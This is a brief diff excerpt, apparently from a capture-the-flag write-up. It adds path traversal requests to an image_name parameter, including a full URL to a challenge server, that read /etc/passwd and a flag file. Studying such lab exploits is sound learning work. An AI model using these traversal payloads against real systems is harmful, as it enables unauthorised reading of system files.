@@ -7,3 +7,7 @@ so now we try finding the flag
 image_name=..//..//..//etc/passwd
 image_name=..//tmp/flag
 
+
+http://35.246.152.131:31460/local?image_name=..//..//..//etc/passwd
+
+local?image_name=..//tmp/flag
